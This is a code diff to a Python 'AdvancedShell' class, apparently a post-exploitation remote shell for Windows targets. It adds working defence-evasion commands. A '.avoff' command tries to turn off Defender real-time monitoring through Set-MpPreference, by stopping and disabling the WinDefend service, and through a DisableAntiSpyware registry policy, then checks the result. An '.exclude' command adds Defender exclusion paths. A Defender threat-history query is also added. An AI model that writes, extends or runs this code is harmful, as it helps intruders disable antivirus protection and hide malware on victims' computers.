@@ -756,6 +756,7 @@ class AdvancedShell:
                 ("AV Products","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState /format:list 2>nul || echo No SecurityCenter2"),
                 ("Defender Exclusions","powershell -c \"Get-MpPreference | Select-Object -Property ExclusionPath,ExclusionExtension,ExclusionProcess | Format-List\" 2>nul"),
                 ("Defender Processes","tasklist | findstr -i \"MsMpEng msmpeng NisSrv nissrv MpCmdRun\""),
+                ("Recent Threats","powershell -c \"Get-MpThreatDetection | Select-Object -First 5 -Property ThreatID,ActionSuccess,Resources | Format-List\" 2>nul"),
             ]
             for label,c in cmds:
                 o=self.execute(c)
@@ -777,6 +778,48 @@ class AdvancedShell:
                     print(f"  {C}{label}:{W}")
                     for l in o.strip().split('\n'):print(f"    {l.strip()}")
                 else:print(f"  {C}{label}:{W} {R}none found{W}")
+
+    def post_avoff(self):
+        """Try to disable Defender real-time monitoring."""
+        if self.target_os!='windows':print(f"{Y}Linux — no Defender{W}");return
+        print(f"{Y}[*] Attempting to disable Defender...{W}")
+        methods=[
+            ('Set-MpPreference','powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true" 2>&1'),
+            ('sc config','sc config WinDefend start= disabled 2>&1'),
+            ('sc stop','sc stop WinDefend 2>&1'),
+            ('Registry','reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1'),
+        ]
+        for name,cmd in methods:
+            print(f"  {Y}[*] {name}...{W}",end=' ',flush=True)
+            o=self.execute(cmd)
+            if o:
+                ol=o.lower()
+                if 'access' in ol and 'denied' in ol:print(f"{R}Access Denied (need SYSTEM/Admin){W}")
+                elif 'error' in ol or 'fail' in ol:print(f"{R}{o.strip()[:80]}{W}")
+                else:print(f"{G}{o.strip()[:80]}{W}")
+            else:print(f"{Y}no output (may have worked){W}")
+        # Verify
+        o=self.execute('powershell -c "(Get-MpComputerStatus).RealTimeProtectionEnabled"')
+        if o:
+            if 'false' in o.lower():print(f"\n{G}[+] RealTimeProtection is now DISABLED ✓{W}")
+            elif 'true' in o.lower():print(f"\n{R}[!] RealTimeProtection still ENABLED — need higher privs{W}")
+            else:print(f"\n{Y}[?] Status: {o.strip()}{W}")
+
+    def post_exclude(self,path):
+        """Add a Defender exclusion path."""
+        if self.target_os!='windows':print(f"{Y}Linux — no Defender{W}");return
+        ep=path.replace('\\','/')
+        print(f"{Y}[*] Adding exclusion: {ep}{W}")
+        o=self.execute(f'powershell -c "Add-MpPreference -ExclusionPath \'\'{ep}\'\' " 2>&1')
+        if o:
+            ol=o.lower()
+            if 'access' in ol and 'denied' in ol:print(f"{R}[!] Access Denied — need Admin{W}")
+            elif 'error' in ol:print(f"{R}[!] {o.strip()[:100]}{W}")
+            else:print(f"{G}[+] Exclusion may have been added{W}")
+        else:print(f"{G}[+] Exclusion added (no error output){W}")
+        # Verify
+        o=self.execute('powershell -c "(Get-MpPreference).ExclusionPath"')
+        if o and '[-]' not in o:print(f"  {C}Current exclusions:{W} {o.strip()}")
 
     def post_kill(self,target):
         """Kill a process by PID or name."""
@@ -835,6 +878,7 @@ class AdvancedShell:
 {BOLD}Execution:{W}
   {G}.exec{W} path [args] Smart exe launcher     {G}.bg{W} cmd           Background run
   {G}.av{W}               AV/Defender status     {G}.kill{W} pid|name    Kill process
+  {G}.avoff{W}            Disable Defender RT    {G}.exclude{W} path     Add AV exclusion
   {G}.exit{W}             Exit
 """)
 
@@ -982,6 +1026,11 @@ class AdvancedShell:
                             self.post_exec(fp,args)
                         else:print('Usage: .exec <path> [args]')
                     elif cmd=='.av':self.post_av()
+                    elif cmd=='.avoff':self.post_avoff()
+                    elif cmd.startswith('.exclude '):
+                        p=cmd.split(' ',1)
+                        if len(p)>1:self.post_exclude(p[1])
+                        else:print('Usage: .exclude <path>')
                     elif cmd.startswith('.kill '):
                         p=cmd.split(None,1)
                         if len(p)>1:self.post_kill(p[1])
